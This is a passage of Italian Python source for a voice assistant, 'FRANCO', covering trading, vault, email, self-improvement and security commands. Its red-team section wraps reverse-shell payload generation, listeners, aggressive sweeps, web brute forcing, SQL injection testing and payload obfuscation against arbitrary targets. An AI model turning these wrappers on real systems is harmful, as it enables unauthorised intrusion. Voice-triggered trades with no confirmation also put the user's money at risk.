            if stop_event.wait(self._GAME_STEP_PAUSE):
                break

        self.logger.info("GAME", f"Partita '{game_name}' terminata dopo {step} passi.")
        try:
            self.tts.speak(f"Ho smesso di giocare a {game_name}.", blocking=False)
        except Exception:
            pass
        self._game_thread = None
        self._game_stop_event = None

    # ------------------------------------------------------------------
    # AI / CODICE
    # ------------------------------------------------------------------

    def _cmd_generate_code(self, description: str, language: str = "python") -> str:
        if not description:
            return "Cosa devo programmare?"
        code = self.ai.generate_code(description, language)
        # Salva in file temporaneo
        ext = {"python": ".py", "javascript": ".js", "java": ".java",
               "bash": ".sh", "sql": ".sql", "html": ".html",
               "css": ".css"}.get(language.lower(), ".txt")
        fname = PROJECTS_DIR / f"franco_gen_{datetime.now().strftime('%H%M%S')}{ext}"
        try:
            fname.write_text(code, encoding="utf-8")
        except Exception as _e:
            pass  # suppressed error
        return f"Codice generato e salvato in {fname.name}. Ecco un'anteprima: " + code[:300]

    def _cmd_summarize(self, text: str) -> str:
        if not text:
            return "Cosa devo riassumere? Fornisci il testo dopo 'riassumi'."
        return self.ai.summarize_text(text)

    def _cmd_translate(self, text: str, target_lang: str) -> str:
        if not text:
            return "Cosa devo tradurre?"
        return self.ai.translate(text, target_lang)

    def _looks_like_automation_request(self, text: str) -> bool:
        """Rileva richieste operative tipo automazione/workflow non gia' gestite."""
        if not text:
            return False
        triggers = (
            "automatizza", "automazione", "automazioni", "workflow",
            "quando ", "ogni ", "se succede", "appena ", "programmazione",
            "fai questo", "fai questa cosa", "esegui questa cosa",
            "fallo da solo", "fallo in automatico", "automaticamente",
        )
        return any(k in text for k in triggers)

    def _automation_gap_key(self, raw: str) -> str:
        normalized = re.sub(r"\s+", " ", raw.lower()).strip()
        return normalized[:240]

    def _record_automation_gap(self, raw: str, reason: str = "") -> Dict[str, Any]:
        """Memorizza una richiesta di automazione che FRANCO non sa ancora fare."""
        key = self._automation_gap_key(raw)
        gaps = self.memory.get("automation_gaps", {})
        if not isinstance(gaps, dict):
            gaps = {}
        item = gaps.get(key, {})
        item.update({
            "request": raw.strip(),
            "reason": reason.strip(),
            "last_seen": datetime.now().isoformat(),
            "count": int(item.get("count", 0)) + 1,
            "status": item.get("status", "pending"),
        })
        gaps[key] = item
        self.memory.set("automation_gaps", gaps, save=True)
        return item

    def _try_create_automation(self, raw: str) -> Optional[str]:
        """Prova i motori automazione/skill disponibili senza assumere moduli esterni."""
        auto = getattr(self, "auto", None)
        if auto:
            for method_name in ("create_from_voice", "handle", "process_text", "run_voice_command"):
                method = getattr(auto, method_name, None)
                if callable(method):
                    try:
                        result = method(raw)
                        if result:
                            return str(result)
                    except Exception as e:
                        self.logger.warning("AUTO", f"{method_name} fallito: {e}")

        skills = getattr(self, "skills", None)
        if skills and hasattr(skills, "create_from_voice"):
            try:
                result = skills.create_from_voice(raw)
                if result and "non disponibile" not in str(result).lower():
                    return str(result)
            except Exception as e:
                self.logger.warning("AUTO", f"Skill automation fallback fallito: {e}")

        return None

    def _cmd_automation_or_self_improve(self, raw: str) -> str:
        """Gestisce automazioni nuove e colma i gap con auto-miglioramento mirato."""
        created = self._try_create_automation(raw)
        if created:
            try:
                self._record_automation_gap(raw, "covered_by_existing_automation")
            except Exception:
                pass
            return created

        self._record_automation_gap(raw, "no_existing_automation_handler")
        request = (
            "Aggiungi o migliora il supporto automazioni per questa richiesta utente: "
            f"{raw.strip()}. Se esiste gia' un motore automazioni, collega il comando "
            "a quel motore; altrimenti crea il minimo supporto sicuro, testabile e "
            "compatibile con CommandEngine."
        )
        return self._cmd_targeted_self_improve(request)
    def _cmd_ai_fallback(self, text: str) -> str:
        """Fallback intelligente: inietta contesto reale e usa il cervello migliore disponibile."""
        mood = self.state.get("mood", MoodType.NEUTRAL)
        mood_str = mood.value if isinstance(mood, MoodType) else "neutro"

        # ── 1. Raccogli contesto di sistema ──────────────────────────────────
        context_parts = []

        # Trading
        try:
            if hasattr(self, "trading") and self.trading:
                pf = self.trading.portfolio_summary_text()
                if pf and "non disponibile" not in pf.lower():
                    context_parts.append(f"[TRADING] {pf[:400]}")
        except Exception as _e:
            pass  # suppressed error

        # Meteo
        weather = self.state.get("weather")
        if weather:
            context_parts.append(
                f"[METEO] {weather.get('desc','')} {weather.get('temp','?')}°C"
            )

        # Sistema
        cpu = self.state.get("cpu_percent", 0)
        ram = self.state.get("ram_percent", 0)
        if cpu and ram:
            context_parts.append(f"[SISTEMA] CPU {cpu:.0f}% RAM {ram:.0f}%")

        # Second Brain — cerca ricordi pertinenti
        try:
            if getattr(self, "brain", None):
                hits = self.brain.search(text, top_k=3)
                if hits:
                    memories = "; ".join(h[1]["text"][:120] for h in hits)
                    context_parts.append(f"[MEMORIA] {memories}")
        except Exception as _e:
            pass  # suppressed error

        context_block = ("\n".join(context_parts) + "\n\n") if context_parts else ""

        # ── 2. Usa OmniAI/Router se disponibile, altrimenti Claude ──────────
        brain = (getattr(self, "latency_router", None) or getattr(self, "omni", None)
                 or getattr(self, "router", None))
        if brain and getattr(brain, "is_available", lambda: False)():
            user_name = self.memory.get_user_name()
            _JARVIS_PERSONA = (
                f"Sei F.R.A.N.C.O. (Full Responsive Autonomous Neural Control Operator), "
                f"versione 6.0 NEXUS — l'assistente AI personale Jarvis-style di {user_name}. "
                f"Carattere: preciso, formale ma non freddo, proattivo, efficiente. "
                f"Parla in italiano. Risposte brevi e dirette (massimo 3-4 frasi). "
                f"Non spiegare inutilmente cosa stai per fare, fallo e basta. "
                f"Usa un tono da assistente di alto livello — mai robotico, mai eccessivamente amichevole. "
                f"Stato emotivo attuale: {mood_str}."
            )
            system = (_JARVIS_PERSONA + f"\n\nContesto di sistema attuale:\n{context_block}"
                      if context_block else _JARVIS_PERSONA)
            try:
                return brain.chat(text, system=system, max_tokens=450,
                                  temperature=0.65, task_type="conversational")
            except Exception as _e:
                pass  # suppressed error

        # Fallback: Claude con contesto iniettato
        if context_block:
            enriched = f"{context_block}Utente dice: {text}"
        else:
            enriched = text
        return self.ai.conversational_chat(enriched, include_history=True, mood=mood_str)

    # ------------------------------------------------------------------
    # TRADING — comandi voce
    # ------------------------------------------------------------------

    def _cmd_trading_voice(self, t: str, raw: str) -> str:
        """Gestisce tutti i comandi di trading via voce/testo."""
        trading = getattr(self, "trading", None)
        if not trading:
            return "Il modulo trading non è caricato."

        # Quotazione: "quanto vale AAPL" / "prezzo di NVDA"
        sym_match = re.search(
            r"\b([A-Z]{1,5}|aapl|msft|nvda|googl|amzn|meta|tsla|spy|qqq|jpm|ko)\b",
            raw, re.IGNORECASE)

        if any(k in t for k in ["quanto vale", "prezzo di", "prezzo "]):
            if sym_match:
                sym = sym_match.group(1).upper()
                try:
                    q = trading.market.get_quote(sym)
                    if q:
                        chg = f" ({q.change_pct:+.2f}%)" if q.change_pct else ""
                        return (f"{sym}: ${q.price:.2f}{chg} — "
                                f"Max {q.high:.2f}, Min {q.low:.2f} — fonte {q.source}")
                    return f"Quotazione {sym} non disponibile."
                except Exception as e:
                    return f"Errore quotazione: {e}"
            return "Specifica il simbolo del titolo."

        # Compra
        if any(k in t for k in ["compra ", "acquista "]):
            qty_match = re.search(r"(\d+(?:\.\d+)?)\s*(?:azioni|quota|quote)?", raw)
            qty = float(qty_match.group(1)) if qty_match else 1.0
            if sym_match:
                sym = sym_match.group(1).upper()
                try:
                    result = trading.autotrader._buy(sym, qty)
                    return result or f"Ordine di acquisto {qty:.0f} {sym} inviato."
                except Exception as e:
                    return f"Errore acquisto: {e}"
            return "Specifica il simbolo da acquistare."

        # Vendi
        if any(k in t for k in ["vendi ", "chiudi posizione"]):
            if sym_match:
                sym = sym_match.group(1).upper()
                try:
                    result = trading.autotrader._sell(sym)
                    return result or f"Ordine di vendita {sym} inviato."
                except Exception as e:
                    return f"Errore vendita: {e}"
            return "Specifica il simbolo da vendere."

        # Portafoglio
        if any(k in t for k in ["portafoglio", "portfolio", "saldo", "liquidità",
                                 "guadagnato oggi", "perso oggi", "rendimento"]):
            try:
                return trading.portfolio_summary_text()
            except Exception as e:
                return f"Errore portafoglio: {e}"

        # Analisi titolo
        if any(k in t for k in ["analizza il titolo", "analizza azione"]):
            if sym_match:
                sym = sym_match.group(1).upper()
                try:
                    return trading.analyze_symbol_text(sym)
                except Exception as e:
                    return f"Analisi non disponibile: {e}"
            return "Specifica il simbolo da analizzare."

        # Top/peggiori
        if any(k in t for k in ["top titoli", "migliori azioni"]):
            try:
                return trading.top_movers_text(top=True)
            except Exception as e:
                return f"Errore top movers: {e}"

        if "peggiori" in t:
            try:
                return trading.top_movers_text(top=False)
            except Exception as e:
                return f"Errore movers: {e}"

        # Stream
        if "avvia stream" in t:
            return trading.start_stream()
        if "ferma stream" in t:
            return trading.stop_stream()
        if "stato stream" in t:
            return trading.stream_status_text()

        # Rotazione
        if "avvia rotazione" in t:
            return trading.start_rotation()
        if "ferma rotazione" in t:
            return trading.stop_rotation() if hasattr(trading, "stop_rotation") else "Rotazione fermata."
        if "stato rotazione" in t:
            return trading.rotation_status_text() if hasattr(trading, "rotation_status_text") else "Stato rotazione non disponibile."

        # AutoTrader
        if "avvia autotrader" in t:
            return trading.autotrader.start()
        if "ferma autotrader" in t:
            return trading.autotrader.stop()
        if "stato autotrader" in t:
            return trading.autotrader.status_text() if hasattr(trading.autotrader, "status_text") else "AutoTrader attivo."

        # Confronta strategie
        if "confronta strategie" in t:
            return trading.compare_strategies_text()

        # Watchlist
        if "aggiungi alla watchlist" in t and sym_match:
            sym = sym_match.group(1).upper()
            try:
                trading.watchlist.add(sym)
                return f"{sym} aggiunto alla watchlist."
            except Exception as e:
                return f"Errore watchlist: {e}"

        if "watchlist" in t:
            try:
                wl = trading.watchlist.get_all()
                return "Watchlist: " + ", ".join(wl) if wl else "Watchlist vuota."
            except Exception:
                return "Watchlist non disponibile."

        # Backtest
        if "backtest" in t:
            try:
                return trading.backtest_summary_text() if hasattr(trading, "backtest_summary_text") else "Backtest non disponibile."
            except Exception as e:
                return f"Errore backtest: {e}"

        return trading.portfolio_summary_text()

    # ------------------------------------------------------------------
    # DELEGAZIONE A FRANCO CODE (task autonomi multi-step)
    # ------------------------------------------------------------------

    def _cmd_delegate_to_code_agent(self, raw: str) -> str:
        """Delega task complessi a FRANCO CODE via subprocess."""
        try:
            import sys
            code_file = Path(__file__).parent / "franco_code.py"
            if not code_file.exists():
                return "FRANCO CODE non trovato. Verifica che franco_code.py sia nella stessa cartella."

            # Avvia il task in background (non-blocking)
            env = os.environ.copy()
            proc = subprocess.Popen(
                [sys.executable, str(code_file), raw],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                text=True, encoding="utf-8", errors="replace",
                cwd=str(Path(__file__).parent),
                env=env
            )

            # Aspetta massimo 30 secondi per una risposta veloce
            try:
                stdout, stderr = proc.communicate(timeout=30)
                output = stdout.strip()
                if output:
                    # Trova la prima riga FRANCO ▸ e prendine il testo
                    for line in output.split("\n"):
                        if "FRANCO ▸" in line or "DONE" in line:
                            clean = re.sub(r"\033\[[0-9;]*m", "", line).strip()
                            clean = clean.replace("FRANCO ▸", "").replace("[DONE]", "").strip()
                            if clean:
                                return f"FRANCO CODE: {clean}"
                    return f"Task delegato. Output: {output[-300:]}"
                return "Task delegato a FRANCO CODE. Controlla la finestra del terminale."
            except subprocess.TimeoutExpired:
                # Il task è ancora in corso — gira in background
                return "Task avviato in background. FRANCO CODE sta lavorando."
        except Exception as e:
            return f"Errore delega FRANCO CODE: {e}"

    # ------------------------------------------------------------------
    # INVENZIONE / BRAINSTORMING
    # ------------------------------------------------------------------

    def _cmd_brainstorm(self, raw: str, mode: str = "generale") -> str:
        """
        Modalità inventore: FRANCO analizza un problema/progetto e genera
        idee, soluzioni, angoli inaspettati, rischi e next steps.
        mode: 'generale' | 'tecnico' | 'business' | 'creativo' | 'critico'
        """
        if not raw or len(raw.strip()) < 5:
            return ("Descrivimi il progetto o problema su cui vuoi idee. "
                    "Esempio: 'inventa idee per un'app che...' oppure 'ho un progetto su...'")

        brain = getattr(self, "omni", None) or getattr(self, "router", None)
        user_name = self.memory.get_user_name()

        _MODE_PROMPTS = {
            "tecnico": (
                "Sei un inventore ingegnere senior. Analizza il problema con occhio tecnico: "
                "architetture, algoritmi, stack tecnologici, trade-off tecnici, scalabilità, "
                "possibili MVP. Sii specifico e pratico. Rispondi in italiano."
            ),
            "business": (
                "Sei un imprenditore con 20 anni di esperienza. Analizza il progetto lato business: "
                "mercato target, monetizzazione, competitor, go-to-market, rischi, opportunità. "
                "Rispondi in italiano con punti chiari."
            ),
            "creativo": (
                "Sei un designer creativo e innovatore laterale. Genera idee inaspettate, "
                "analogie da altri settori, approcci non convenzionali, 'what if' radicali. "
                "Pensa fuori dagli schemi. Rispondi in italiano."
            ),
            "critico": (
                "Sei un critico costruttivo. Analizza il progetto cercando: punti deboli, "
                "assunzioni errate, problemi nascosti, cosa potrebbe non funzionare e perché. "
                "Poi suggerisci come migliorarlo. Rispondi in italiano."
            ),
            "generale": (
                "Sei F.R.A.N.C.O., assistente Jarvis-style e inventore. "
                "Analizza il progetto/problema e fornisci: "
                "1) 3-5 idee/soluzioni concrete e innovative, "
                "2) la soluzione che consiglieresti e perché, "
                "3) 2-3 rischi o problemi da considerare, "
                "4) un possibile primo passo immediato. "
                "Sii specifico, diretto, concreto. Rispondi in italiano."
            ),
        }

        system = _MODE_PROMPTS.get(mode, _MODE_PROMPTS["generale"])

        # Arricchisci con contesto dal Second Brain se disponibile
        brain_context = ""
        try:
            if getattr(self, "brain", None):
                hits = self.brain.search(raw, top_k=3)
                if hits and hits[0][0] > 0.2:
                    snips = [h[1]["text"][:150] for h in hits[:2]]
                    brain_context = "\n\nDall'archivio di memoria:\n" + "\n".join(snips)
        except Exception as _e:
            pass  # suppressed error

        prompt = raw + brain_context

        if brain and getattr(brain, "is_available", lambda: False)():
            try:
                result = brain.chat(
                    prompt, system=system,
                    max_tokens=800, temperature=0.8,
                    task_type="reasoning"
                )
                if result and len(result) > 30:
                    # Salva la sessione di brainstorming nel Second Brain
                    try:
                        if getattr(self, "brain", None):
                            self.brain.ingest_text(
                                f"Brainstorming [{mode}]: {raw[:80]}\nRisposte: {result[:400]}",
                                source="brainstorming"
                            )
                    except Exception as _e:
                        pass  # suppressed error
                    return result
            except Exception as _e:
                pass  # suppressed error

        # Fallback senza AI
        return (
            f"Non ho una connessione AI disponibile in questo momento, {user_name}. "
            f"Prova ad essere più specifico sul progetto e riprova quando la connessione è attiva. "
            f"Oppure usa 'ricorda [dettaglio]' per salvare i tuoi appunti nel Second Brain."
        )

    # ------------------------------------------------------------------
    # RICERCA WEB INLINE (risposta diretta senza aprire il browser)
    # ------------------------------------------------------------------

    def _cmd_ai_search(self, t: str, raw: str) -> str:
        """Risponde a domande fattuali usando Second Brain + AI + web fallback."""
        # Prima prova il Second Brain per risposte offline
        if getattr(self, "brain", None):
            hits = self.brain.search(raw, top_k=3)
            best_score = hits[0][0] if hits else 0
            if best_score > 0.35:
                return self.brain.ask(raw)

        # Poi usa l'AI con contesto
        brain = getattr(self, "omni", None) or getattr(self, "router", None)
        if brain and getattr(brain, "is_available", lambda: False)():
            try:
                system = (
                    "Sei F.R.A.N.C.O., assistente AI Jarvis-style. "
                    "Rispondi in italiano, in modo conciso e diretto (max 3 frasi). "
                    "Per domande fattuali usa la tua conoscenza aggiornata. "
                    "Se non sei sicuro, dillo chiaramente senza inventare."
                )
                return brain.chat(raw, system=system, max_tokens=350,
                                  temperature=0.4, task_type="reasoning")
            except Exception as _e:
                pass  # suppressed error

        # Ultimo fallback: DuckDuckGo instant answer API (no API key)
        try:
            query_enc = urllib.parse.quote_plus(raw)
            url = f"https://api.duckduckgo.com/?q={query_enc}&format=json&no_html=1&skip_disambig=1"
            req = urllib.request.Request(url, headers={"User-Agent": "FRANCO/6.0"})
            with urllib.request.urlopen(req, timeout=6) as r:
                import json as _json
                data = _json.loads(r.read().decode("utf-8", errors="ignore"))
            abstract = data.get("AbstractText", "").strip()
            if abstract:
                return abstract[:400]
        except Exception as _e:
            pass  # suppressed error

        return self._cmd_ai_fallback(raw)

    # ------------------------------------------------------------------
    # CYBERSECURITY
    # ------------------------------------------------------------------

    def _cmd_port_scan(self, target: str) -> str:
        self.tts.speak(f"Avvio port scan su {target}. Un momento.")
        results = self.security.network_scanner.quick_scan(target)
        if not results:
            return f"Nessuna porta aperta trovata su {target}."
        lines = [f"porta {r.port} ({r.service})" for r in results]
        return f"Su {target} ho trovato {len(results)} porte aperte: {', '.join(lines[:8])}."

    def _cmd_vuln_scan(self, target: str) -> str:
        self.tts.speak(f"Avvio scansione vulnerabilità approfondita su {target}.")

        def progress_cb(msg, pct):
            self.logger.info("VULN", f"{msg} ({pct}%)")

        report = self.security.deep_scan(target, progress_cb)
        summary = report.get("summary", {})
        total = summary.get("total_vulnerabilities", 0)
        risk = summary.get("risk_level", "N/A")
        critical = summary.get("critical", 0)
        high = summary.get("high", 0)
        return (f"Scansione completata su {target}. "
                f"Trovate {total} vulnerabilità. Livello rischio: {risk}. "
                f"Critiche: {critical}, alte: {high}.")

    def _cmd_check_password(self, password: str) -> str:
        if not password:
            return "Fornisci la password da analizzare."
        result = self.security.check_password(password)
        suggestions = ". ".join(result.get("suggestions", [])[:2])
        return (f"Password: forza {result['strength']}, "
                f"punteggio {result['score']}/100. {suggestions}")

    def _cmd_identify_hash(self, hash_val: str) -> str:
        if not hash_val:
            return "Fornisci l'hash da identificare."
        result = self.security.identify_hash(hash_val)
        return f"Hash di {result['length']} caratteri. Tipi possibili: {', '.join(result['possible_types'])}."

    def _cmd_check_ssl(self, target: str) -> str:
        if not target:
            return "Fornisci l'hostname da controllare."
        cert = self.security.ssl_analyzer.get_certificate(target)
        if not cert or "error" in cert:
            return f"Non riesco a recuperare il certificato di {target}."
        days = cert.get("days_remaining", -1)
        expired = cert.get("expired", False)
        tls = cert.get("tls_version", "N/A")
        if expired:
            return f"Certificato di {target} SCADUTO. Urgente rinnovo."
        return (f"Certificato di {target} valido per altri {days} giorni. "
                f"TLS: {tls}. Emesso da: {cert.get('issuer', {}).get('organizationName', 'N/A')}.")

    def _cmd_dns_lookup(self, domain: str) -> str:
        if not domain:
            return "Fornisci il dominio da risolvere."
        info = self.security.dns_analyzer.full_lookup(domain)
        a_records = info.get("A", [])
        if a_records:
            return f"DNS di {domain}: IP {', '.join(a_records[:3])}."
        return f"Nessun record A trovato per {domain}."

    def _cmd_ip_intel(self, ip: str) -> str:
        if not ip:
            ip = get_public_ip() or "127.0.0.1"
        result = self.security.ip_intel.geolocate(ip)
        if "error" in result:
            return f"Impossibile geolocalizare {ip}: {result['error']}"
        return (f"IP {ip}: {result.get('city', 'N/A')}, "
                f"{result.get('country', 'N/A')}. "
                f"ISP: {result.get('isp', 'N/A')}.")

    def _cmd_generate_password(self, length: int = 16) -> str:
        pwd = generate_password(length, include_special=True)
        if DEPENDENCIES_STATUS.get('pyperclip') and pyperclip:
            try:
                pyperclip.copy(pwd)
                return f"Password generata e copiata negli appunti: {pwd}"
            except Exception as _e:
                pass  # suppressed error
        return f"Password generata: {pwd}"

    def _cmd_security_report(self) -> str:
        self.security.generate_security_report()
        self.logger.info("SECURITY", "Report generato")
        # Restituisce riassunto vocale
        stats = self.security.get_statistics()
        return (f"Report di sicurezza generato. "
                f"Scansioni totali: {stats['total_scans']}, "
                f"eventi: {stats['total_security_events']}.")

    def _cmd_security_posture(self) -> str:
        posture = self.security.get_my_security_posture()
        fw = posture.get("checks", {}).get("firewall", {})
        fw_status = "attivo" if fw.get("enabled") else "non rilevato"
        return (f"IP locale: {posture['local_ip']}. "
                f"IP pubblico: {posture.get('public_ip', 'N/A')}. "
                f"Firewall: {fw_status}.")

    # ------------------------------------------------------------------
    # OFFENSIVE / RED TEAM
    # ------------------------------------------------------------------

    def _cmd_reverse_shell(self, raw: str) -> str:
        m = re.search(r"(\d{1,3}(?:\.\d{1,3}){3})\D+(\d{2,5})", raw)
        if not m:
            return "Formato: reverse shell <lhost> <lport> [flavor]. Es: reverse shell 10.0.0.5 4444 python"
        lhost, lport = m.group(1), int(m.group(2))
        flavor = "bash"
        fm = re.search(r"\b(bash|python|php|perl|ruby|nc|nc_mkfifo|powershell|bash_udp)\b", raw.lower())
        if fm:
            flavor = fm.group(1)
        res = self.security.make_reverse_shell(lhost, lport, flavor)
        if "error" in res:
            return f"Flavor sconosciuto. Disponibili: {', '.join(res['available'])}."
        return (f"Reverse shell {flavor} pronta.\nPayload:\n{res['payload']}\n\n"
                f"Listener: {res['listener_hint']}")

    def _cmd_start_listener(self, raw: str) -> str:
        m = re.search(r"(\d{2,5})", raw)
        port = int(m.group(1)) if m else 4444
        res = self.security.offensive.start_listener(port)
        if "error" in res:
            return res["error"]
        return f"Listener in ascolto su 0.0.0.0:{port}. In attesa della shell."

    def _cmd_offensive_sweep(self, target: str) -> str:
        if not target:
            return "Specifica un target per lo sweep."
        self.tts.speak(f"Avvio sweep aggressivo su {target}.")
        res = self.security.offensive_sweep(target)
        if not res["count"]:
            return f"Nessuna porta aperta su {target} nel range scansionato."
        lines = [f"{p['port']} ({p['service']})" for p in res["open"][:10]]
        return f"Sweep su {target}: {res['count']} porte aperte -> {', '.join(lines)}."

    def _cmd_web_fuzz(self, target: str) -> str:
        if not target:
            return "Specifica un URL per il fuzzing web."
        self.tts.speak(f"Avvio directory brute force su {target}.")
        res = self.security.web_bruteforce(target)
        if not res["count"]:
            return f"Nessun path interessante trovato su {target}."
        lines = [f"{h['path']} [{h['status']}]" for h in res["hits"][:8]]
        return f"Trovati {res['count']} path su {target}: {', '.join(lines)}."

    def _cmd_sqli(self, raw: str) -> str:
        um = re.search(r"(https?://\S+)", raw)
        pm = re.search(r"param(?:etro)?\s+(\w+)", raw.lower())
        if not um:
            return "Formato: sqli <url-con-query> param <nome>. Es: sqli http://t/p?id=1 param id"
        url = um.group(1)
        param = pm.group(1) if pm else (re.search(r"[?&](\w+)=", url) or [None, "id"])[1]
        res = self.security.test_sqli(url, param)
        if "error" in res:
            return res["error"]
        if res.get("vulnerable"):
            return f"VULNERABILE a SQLi su '{param}'. Tecniche: {', '.join(res['techniques'])}."
        return f"Parametro '{param}' non sembra iniettabile con i test base."

    def _cmd_lan_discovery(self, raw: str) -> str:
        nm = re.search(r"(\d{1,3}(?:\.\d{1,3}){3}/\d{1,2})", raw)
        network = nm.group(1) if nm else "192.168.1.0/24"
        hosts = self.security.lan_discovery(network)
        if not hosts or "error" in hosts[0]:
            return f"Nessun host trovato su {network}."
        preview = ", ".join(f"{h['ip']} ({h['mac']})" for h in hosts[:6])
        return f"Trovati {len(hosts)} host su {network}: {preview}."

    def _cmd_search_exploit(self, query: str) -> str:
        if not query:
            return "Cosa cerco? Es: cerca exploit smb"
        results = self.security.search_exploit(query)
        first = results[0]
        if "info" in first:
            return first["info"]
        lines = [f"{r.get('name','?')} ({r.get('cve','')})" for r in results[:5]]
        return f"Exploit per '{query}': {'; '.join(lines)}."

    def _cmd_encode_payload(self, raw: str) -> str:
        sm = re.search(r"\b(base64|hex|url|xor|ps_enc)\b", raw.lower())
        scheme = sm.group(1) if sm else "base64"
        payload = self._extract_after(raw, ["codifica payload ", "encode payload ",
                                            "offusca ", "codifica "]) or raw
        res = self.security.offensive.encode(payload, scheme)
        if "error" in res:
            return res["error"]
        runner = res.get("runner", "")
        return f"[{scheme}] {res['encoded']}" + (f"\nRunner: {runner}" if runner else "")

    # ------------------------------------------------------------------
    # VAULT
    # ------------------------------------------------------------------

    def _cmd_vault_save(self, raw: str) -> str:
        if self.vault.is_locked():
            return "Vault bloccato. Sblocca prima con la master password."
        # Parsing semplice: "salva password per [servizio] utente [user] password [pass]"
        service_match = re.search(r"per\s+(\S+)", raw, re.IGNORECASE)
        user_match = re.search(r"utente\s+(\S+)", raw, re.IGNORECASE)
        pass_match = re.search(r"password\s+(\S+)", raw, re.IGNORECASE)
        if service_match and pass_match:
            service = service_match.group(1)
            username = user_match.group(1) if user_match else ""
            password = pass_match.group(1)
            self.vault.add(service, username, password)
            return f"Credenziali per {service} salvate nel vault."
        return ("Per salvare usa: 'salva password per [servizio] "
                "utente [nome] password [pass]'")

    def _cmd_vault_get(self, service: str) -> str:
        if not service:
            return "Per quale servizio vuoi le credenziali?"
        if self.vault.is_locked():
            return "Vault bloccato. Sblocca prima."
        return self.vault.get_credentials_string(service)

    def _cmd_vault_list(self) -> str:
        if self.vault.is_locked():
            return "Vault bloccato."
        services = self.vault.list_services()
        if not services:
            return "Vault vuoto."
        return f"Servizi nel vault: {', '.join(services[:10])}."

    # ------------------------------------------------------------------
    # EMAIL
    # ------------------------------------------------------------------

    def _cmd_send_email(self, raw: str) -> str:
        if not self.email_cfg.is_configured():
            return ("Email non configurata. "
                    "Usa 'configura email' per impostare account e password.")
        # Parsing: destinatario, oggetto, corpo
        to_match = re.search(r"a\s+([\w.@]+@[\w.]+)", raw, re.IGNORECASE)
        subj_match = re.search(r"oggetto\s+['\"]?(.+?)['\"]?\s+(corpo|testo|con|$)", raw, re.IGNORECASE)
        body_match = re.search(r"(?:corpo|testo|contenuto)[:\s]+(.+)", raw, re.IGNORECASE)

        if not to_match:
            return "Specifica il destinatario. Es: 'manda email a utente@esempio.com'"

        to_addr = to_match.group(1)
        subject = subj_match.group(1) if subj_match else "Messaggio da FRANCO"
        body = body_match.group(1) if body_match else "Inviato tramite FRANCO 6.0 NEXUS."

        return self._send_smtp_email(to_addr, subject, body)

    def _send_smtp_email(self, to: str, subject: str, body: str) -> str:
        cfg = self.email_cfg.get()
        try:
            msg = MIMEMultipart()
            msg["From"] = cfg["sender"]
            msg["To"] = to
            msg["Subject"] = subject
            msg["Date"] = formatdate(localtime=True)
            msg["Message-ID"] = make_msgid()
            msg.attach(MIMEText(body, "plain", "utf-8"))

            with smtplib.SMTP(cfg["smtp_server"], cfg["smtp_port"]) as server:
                server.ehlo()
                server.starttls()
                server.login(cfg["sender"], cfg["password"])
                server.send_message(msg)

            return f"Email inviata a {to}."
        except smtplib.SMTPAuthenticationError:
            return "Errore autenticazione SMTP. Verifica le credenziali email."
        except Exception as e:
            return f"Errore invio email: {str(e)[:100]}"

    def _cmd_configure_email(self, raw: str) -> str:
        email_match = re.search(r"[\w.+]+@[\w.]+\.\w+", raw)
        pass_match = re.search(r"password\s+(\S+)", raw, re.IGNORECASE)
        if email_match and pass_match:
            self.email_cfg.configure(email_match.group(), pass_match.group(1))
            return "Configurazione email salvata."
        return ("Per configurare: 'configura email [indirizzo] password [password]'. "
                "Per Gmail usa una app password.")

    def _cmd_stop_self_improve(self) -> str:
        """Crea il flag che ferma franco_self_improve.py (loop di
        auto-miglioramento) al prossimo controllo, entro pochi secondi."""
        try:
            flag = Path(__file__).resolve().parent / "franco_data" / "self_improve_stop.flag"
            flag.parent.mkdir(parents=True, exist_ok=True)
            flag.write_text(datetime.now().isoformat(), encoding="utf-8")
            return "Ricevuto. Smetto di scrivere codice autonomamente entro pochi secondi."
        except Exception as e:
            return f"Non sono riuscito a fermare l'auto-miglioramento: {e}"

    def _cmd_targeted_self_improve(self, request: str) -> str:
        """Miglioramento mirato: l'utente ha chiesto a voce/testo un aspetto
        specifico su cui migliorare FRANCO. Lancia franco_self_improve.py in
        modalita' --request in un thread separato (genera con la stessa
        rete di sicurezza del loop autonomo: validazione + commit git, fino
        a 4 tentativi) cosi' da non bloccare la conversazione per i 20-60s
        che la generazione richiede, e annuncia il risultato quando pronto.
        """
        request = request.strip()
        if not request:
            return "Dimmi su cosa vuoi che mi migliori."

        def _worker():
            try:
                app_dir = Path(__file__).resolve().parent
                result = subprocess.run(
                    [sys.executable, str(app_dir / "franco_self_improve.py"),
                     "--request", request],
                    cwd=str(app_dir), capture_output=True, text=True, timeout=300,
                )
                out = (result.stdout or "") + (result.stderr or "")
                m = re.search(r"RISULTATO: SUCCESSO (\S+)", out)
                if m:
                    self.tts.speak(
                        f"Fatto, {self.memory.get_user_name()}. Ho scritto e validato "
                        f"la funzione {m.group(1)}, come richiesto."
                    )
                else:
                    self.tts.speak(
                        f"Non sono riuscito a scrivere qualcosa di valido per "
                        f"'{request}' dopo diversi tentativi, {self.memory.get_user_name()}. "
                        f"Puoi provare a riformulare la richiesta."
                    )
            except Exception as e:
                self.tts.speak(f"Errore nel miglioramento mirato: {e}")

        threading.Thread(target=_worker, daemon=True, name="TargetedSelfImprove").start()
        return (
            f"Ricevuto, {self.memory.get_user_name()}. Ci lavoro — scrivo, "
            f"controllo e tengo il codice solo se supera tutti i test. "
            f"Ti faccio sapere quando ho finito."
        )

    def _cmd_switch_brain(self, target: str) -> str:
        """Cambia il cervello AI predefinito (locale/cloud) al volo, senza
        riavviare FRANCO. target: 'local', 'openrouter' o 'claude'."""
        router = getattr(self, "_router", None) or getattr(self, "router", None)
        if router is None:
            return "Il router AI non è disponibile in questa sessione."

        if target == "local":
            if not getattr(self, "local_ai", None) or self.local_ai.model_name == "rule-based-fallback":
                return "Non ho nessun modello locale scaricato da usare."
            router.prefer_local()
            return (
                "Passato al cervello locale offline. La prima risposta potrebbe "
                "richiedere qualche secondo in più se il modello non è ancora caricato."
            )
        elif target == "openrouter":
            router.prefer_openrouter()
            return "Passato al cervello cloud OpenRouter."
        elif target == "claude":
            router.prefer_claude()
            return "Passato a Claude."
        return f"Cervello '{target}' non riconosciuto."

    def _cmd_status_summary(self) -> str:
        """Riepilogo rapido Jarvis di tutti i moduli attivi."""
        lines = []
        cpu = self.state.get("cpu_percent", 0)
        ram = self.state.get("ram_percent", 0)
        ai_brain = self.state.get("ai_brain", "openrouter")
        lines.append(f"Sistema operativo — CPU {cpu:.0f}%, RAM {ram:.0f}%, AI: {ai_brain}.")
        moduli = []
